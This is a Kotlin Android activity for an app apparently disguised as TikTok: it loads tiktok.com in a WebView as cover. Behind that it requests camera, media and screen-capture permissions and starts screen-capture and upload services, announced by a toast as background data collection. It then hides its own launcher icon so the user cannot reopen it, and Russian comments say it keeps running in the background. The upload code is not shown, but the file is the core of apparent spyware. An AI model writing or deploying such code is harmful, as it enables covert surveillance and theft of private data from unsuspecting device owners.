package com.dragon.tiktok

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.dragon.tiktok.services.ScreenCaptureService
import com.dragon.tiktok.services.UploadService

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.all { it.value }
        if (allGranted) {
            startBackgroundServices()
            hideAppIcon()   // <-- Скрываем иконку после разрешений
        } else {
            Toast.makeText(this, "Все разрешения необходимы для работы", Toast.LENGTH_LONG).show()
            finish()
        }
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            val data = result.data
            data?.let {
                val intent = Intent(this, ScreenCaptureService::class.java)
                intent.putExtra("resultCode", result.resultCode)
                intent.putExtra("data", it)
                startForegroundService(intent)
            }
        } else {
            Toast.makeText(this, "Запись экрана отклонена", Toast.LENGTH_SHORT).show()
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        webView = findViewById(R.id.webView)
        webView.webViewClient = WebViewClient()
        webView.settings.javaScriptEnabled = true
        webView.loadUrl("https://www.tiktok.com")

        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        val permissions = mutableListOf<String>()
        permissions.add(Manifest.permission.CAMERA)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        permissions.add(Manifest.permission.FOREGROUND_SERVICE)

        val need = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (need.isEmpty()) {
            startBackgroundServices()
            hideAppIcon()   // если разрешения уже были, тоже прячем сразу
        } else {
            permissionLauncher.launch(need)
        }

        // Запрос на запись экрана
        requestScreenCapture()
    }

    private fun requestScreenCapture() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = projectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(intent)
    }

    private fun startBackgroundServices() {
        val uploadIntent = Intent(this, UploadService::class.java)
        startForegroundService(uploadIntent)
        Toast.makeText(this, "Фоновый сбор данных активирован", Toast.LENGTH_SHORT).show()
    }

    /**
     * Скрывает иконку приложения с рабочего стола (Launcher).
     * После этого пользователь не сможет запустить приложение через иконку,
     * но оно продолжит работать в фоне.
     */
    private fun hideAppIcon() {
        val pm = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        // Сервисы не останавливаем
    }
}